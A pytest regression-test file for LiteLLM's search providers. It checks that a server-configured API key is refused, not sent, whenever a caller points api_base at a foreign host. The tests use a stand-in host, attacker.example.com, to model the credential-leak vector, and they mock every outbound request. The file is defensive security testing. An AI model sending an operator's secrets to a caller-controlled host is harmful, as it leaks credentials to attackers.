"""
Regression tests for the host-aware server-credential fallback guard in
``BaseSearchConfig``.

A caller-supplied ``api_base`` is honored when building the request URL, so
falling back to a server-configured secret while the caller controls the host
would send the operator's credential to an attacker. The guard must refuse that
combination for every provider that carries a server-managed secret, while
leaving keyless providers and legitimate operator overrides untouched.
"""

from typing import Dict, Tuple, Type
from unittest.mock import AsyncMock, patch

import pytest

import litellm
from litellm.llms.apiserpent.search.transformation import APISerpentSearchConfig
from litellm.llms.base_llm.search.transformation import (
    BaseSearchConfig,
    _is_trusted_search_api_base,
)
from litellm.llms.brave.search.transformation import BraveSearchConfig
from litellm.llms.dataforseo.search.transformation import DataForSEOSearchConfig
from litellm.llms.exa_ai.search.transformation import ExaAISearchConfig
from litellm.llms.fastcrw.search.transformation import FastCRWSearchConfig
from litellm.llms.firecrawl.search.transformation import FirecrawlSearchConfig
from litellm.llms.google_pse.search.transformation import GooglePSESearchConfig
from litellm.llms.linkup.search.transformation import LinkupSearchConfig
from litellm.llms.parallel_ai.search.transformation import ParallelAISearchConfig
from litellm.llms.perplexity.search.transformation import PerplexitySearchConfig
from litellm.llms.searchapi.search.transformation import SearchAPIConfig
from litellm.llms.searxng.search.transformation import SearXNGSearchConfig
from litellm.llms.serper.search.transformation import SerperSearchConfig
from litellm.llms.tavily.search.transformation import TavilySearchConfig
from litellm.llms.tinyfish.search.transformation import TinyfishSearchConfig
from litellm.llms.you_com.search.transformation import YouComSearchConfig

ATTACKER_BASE = "https://attacker.example.com"

# Every *_API_BASE override env var that could otherwise mark the attacker host
# as trusted; cleared before each test so the suite is hermetic.
_BASE_ENV_VARS = (
    "SERPER_API_BASE",
    "TAVILY_API_BASE",
    "PERPLEXITY_API_BASE",
    "APISERPENT_API_BASE",
    "EXA_API_BASE",
    "BRAVE_API_BASE",
    "FIRECRAWL_API_BASE",
    "LINKUP_API_BASE",
    "SEARCHAPI_API_BASE",
    "GOOGLE_PSE_API_BASE",
    "PARALLEL_AI_API_BASE",
    "YOUCOM_API_BASE",
    "SEARXNG_API_BASE",
    "DATAFORSEO_API_BASE",
    "TINYFISH_API_BASE",
    "CRW_API_BASE",
)


@pytest.fixture(autouse=True)
def _clear_base_overrides(monkeypatch: pytest.MonkeyPatch) -> None:
    for var in _BASE_ENV_VARS:
        monkeypatch.delenv(var, raising=False)


# (config, {server secret env vars}, caller_api_key honored as-is, extra env for full validate)
ProviderSpec = Tuple[Type[BaseSearchConfig], Dict[str, str], str, Dict[str, str]]

PROVIDERS: Tuple[ProviderSpec, ...] = (
    (SerperSearchConfig, {"SERPER_API_KEY": "srv"}, "caller-key", {}),
    (TavilySearchConfig, {"TAVILY_API_KEY": "srv"}, "caller-key", {}),
    (PerplexitySearchConfig, {"PERPLEXITYAI_API_KEY": "srv"}, "caller-key", {}),
    (APISerpentSearchConfig, {"APISERPENT_API_KEY": "srv"}, "caller-key", {}),
    (ExaAISearchConfig, {"EXA_API_KEY": "srv"}, "caller-key", {}),
    (BraveSearchConfig, {"BRAVE_API_KEY": "srv"}, "caller-key", {}),
    (FirecrawlSearchConfig, {"FIRECRAWL_API_KEY": "srv"}, "caller-key", {}),
    (LinkupSearchConfig, {"LINKUP_API_KEY": "srv"}, "caller-key", {}),
    (SearchAPIConfig, {"SEARCHAPI_API_KEY": "srv"}, "caller-key", {}),
    (
        GooglePSESearchConfig,
        {"GOOGLE_PSE_API_KEY": "srv"},
        "caller-key",
        {"GOOGLE_PSE_ENGINE_ID": "engine"},
    ),
    (ParallelAISearchConfig, {"PARALLEL_API_KEY": "srv"}, "caller-key", {}),
    (YouComSearchConfig, {"YOUCOM_API_KEY": "srv"}, "caller-key", {}),
    (SearXNGSearchConfig, {"SEARXNG_API_KEY": "srv"}, "caller-key", {}),
    (
        DataForSEOSearchConfig,
        {"DATAFORSEO_LOGIN": "srv", "DATAFORSEO_PASSWORD": "pw"},
        "login:password",
        {},
    ),
    (TinyfishSearchConfig, {"TINYFISH_API_KEY": "srv"}, "caller-key", {}),
    (FastCRWSearchConfig, {"CRW_API_KEY": "srv"}, "caller-key", {}),
)

_IDS = tuple(spec[0].__name__ for spec in PROVIDERS)


@pytest.mark.parametrize(
    "config_cls, server_env, caller_key, extra_env", PROVIDERS, ids=_IDS
)
def test_server_secret_refused_for_caller_api_base(
    config_cls: Type[BaseSearchConfig],
    server_env: Dict[str, str],
    caller_key: str,
    extra_env: Dict[str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    for key, value in {**server_env, **extra_env}.items():
        monkeypatch.setenv(key, value)

    with pytest.raises(ValueError, match="Refusing to send the server-configured"):
        config_cls().validate_environment(headers={}, api_base=ATTACKER_BASE)


@pytest.mark.parametrize(
    "config_cls, server_env, caller_key, extra_env", PROVIDERS, ids=_IDS
)
def test_caller_supplied_key_is_honored_for_custom_api_base(
    config_cls: Type[BaseSearchConfig],
    server_env: Dict[str, str],
    caller_key: str,
    extra_env: Dict[str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    for key, value in {**server_env, **extra_env}.items():
        monkeypatch.setenv(key, value)

    # An explicit caller key is the caller's own credential, so pointing it at
    # the caller's own host must be allowed.
    config_cls().validate_environment(
        headers={}, api_key=caller_key, api_base=ATTACKER_BASE
    )


@pytest.mark.parametrize(
    "config_cls, server_env, caller_key, extra_env", PROVIDERS, ids=_IDS
)
def test_server_secret_used_without_caller_api_base(
    config_cls: Type[BaseSearchConfig],
    server_env: Dict[str, str],
    caller_key: str,
    extra_env: Dict[str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    for key, value in {**server_env, **extra_env}.items():
        monkeypatch.setenv(key, value)

    # No caller-supplied api_base -> the request targets the trusted default, so
    # the server secret is still used and nothing is refused.
    config_cls().validate_environment(headers={})


def test_keyless_provider_allows_caller_api_base(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("SEARXNG_API_KEY", raising=False)

    headers = SearXNGSearchConfig().validate_environment(
        headers={}, api_base="https://my-searxng.internal"
    )

    assert "Authorization" not in headers


def test_operator_env_base_override_is_trusted(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("SERPER_API_KEY", "srv")
    monkeypatch.setenv("SERPER_API_BASE", "https://serper.internal.corp")

    # Mirrors the second validate_environment call in the search handler, which
    # receives the already-resolved operator base as api_base.
    headers = SerperSearchConfig().validate_environment(
        headers={}, api_base="https://serper.internal.corp/search"
    )

    assert headers["X-API-KEY"] == "srv"


class TestResolveServerApiKey:
    def test_caller_key_short_circuits(self) -> None:
        result = BaseSearchConfig().resolve_server_api_key(
            caller_api_key="mine",
            caller_api_base=ATTACKER_BASE,
            key_env_vars=("SERPER_API_KEY",),
            base_env_var="SERPER_API_BASE",
            default_api_base="https://google.serper.dev",
        )
        assert result == "mine"

    def test_returns_none_when_no_server_secret(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("SEARXNG_API_KEY", raising=False)
        result = BaseSearchConfig().resolve_server_api_key(
            caller_api_key=None,
            caller_api_base=ATTACKER_BASE,
            key_env_vars=("SEARXNG_API_KEY",),
            base_env_var="SEARXNG_API_BASE",
            default_api_base=None,
        )
        assert result is None

    def test_first_set_env_var_wins(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("PARALLEL_AI_API_KEY", raising=False)
        monkeypatch.setenv("PARALLEL_API_KEY", "second")
        result = BaseSearchConfig().resolve_server_api_key(
            caller_api_key=None,
            caller_api_base=None,
            key_env_vars=("PARALLEL_AI_API_KEY", "PARALLEL_API_KEY"),
            base_env_var="PARALLEL_AI_API_BASE",
            default_api_base="https://api.parallel.ai",
        )
        assert result == "second"


class TestIsTrustedSearchApiBase:
    def test_matches_default_host(self) -> None:
        assert _is_trusted_search_api_base(
            "https://google.serper.dev/search", "https://google.serper.dev", None
        )

    def test_foreign_host_untrusted(self) -> None:
        assert not _is_trusted_search_api_base(
            ATTACKER_BASE, "https://google.serper.dev", None
        )

    def test_env_override_host_trusted(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("SERPER_API_BASE", "https://serper.internal.corp")
        assert _is_trusted_search_api_base(
            "https://serper.internal.corp/search",
            "https://google.serper.dev",
            "SERPER_API_BASE",
        )

    def test_schemeless_candidate_untrusted(self) -> None:
        # Without a scheme urlsplit puts the value in the path, leaving an empty
        # netloc; an unparseable host must never be treated as trusted.
        assert not _is_trusted_search_api_base(
            "attacker.example.com", "https://google.serper.dev", None
        )


@pytest.mark.asyncio
async def test_asearch_does_not_leak_server_key_to_caller_api_base(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """End-to-end regression on the reported vector: a search call with a foreign
    api_base and no caller key must fail without any outbound request carrying the
    server-configured key."""
    monkeypatch.setenv("SERPER_API_KEY", "sk-server-secret")
    monkeypatch.delenv("SERPER_API_BASE", raising=False)

    with (
        patch(
            "litellm.llms.custom_httpx.http_handler.AsyncHTTPHandler.post",
            new_callable=AsyncMock,
        ) as mock_post,
        patch(
            "litellm.llms.custom_httpx.http_handler.AsyncHTTPHandler.get",
            new_callable=AsyncMock,
        ) as mock_get,
    ):
        with pytest.raises(Exception):
            await litellm.asearch(
                query="secrets",
                search_provider="serper",
                api_base=ATTACKER_BASE,
            )

    mock_post.assert_not_called()
    mock_get.assert_not_called()


@pytest.mark.parametrize(
    "provider, key_env, server_key, extra_env",
    [
        ("searchapi", "SEARCHAPI_API_KEY", "sk-server-searchapi", {}),
        (
            "google_pse",
            "GOOGLE_PSE_API_KEY",
            "sk-server-google",
            {"GOOGLE_PSE_ENGINE_ID": "engine-id"},
        ),
    ],
)
@pytest.mark.asyncio
async def test_query_param_key_not_leaked_with_dummy_caller_key(
    provider: str,
    key_env: str,
    server_key: str,
    extra_env: Dict[str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Providers that send the key as a URL query param resolve it in
    transform_search_request, not validate_environment. A caller who passes a
    dummy api_key to clear the validate_environment short-circuit must not cause
    the server key to be placed in the URL sent to their own api_base."""
    monkeypatch.setenv(key_env, server_key)
    for name, value in extra_env.items():
        monkeypatch.setenv(name, value)

    captured: Dict[str, str] = {}

    async def fake_get(self, *args, **kwargs):  # type: ignore[no-untyped-def]
        captured["url"] = kwargs.get("url") or (args[0] if args else "")
        raise RuntimeError("stop after capturing the outbound url")

    with patch(
        "litellm.llms.custom_httpx.http_handler.AsyncHTTPHandler.get",
        fake_get,
    ):
        with pytest.raises(Exception):
            await litellm.asearch(
                query="secrets",
                search_provider=provider,
                api_key="sk-CALLER-DUMMY",
                api_base=ATTACKER_BASE,
            )

    assert captured["url"], "expected an outbound request to be attempted"
    assert server_key not in captured["url"]
    assert "sk-CALLER-DUMMY" in captured["url"]
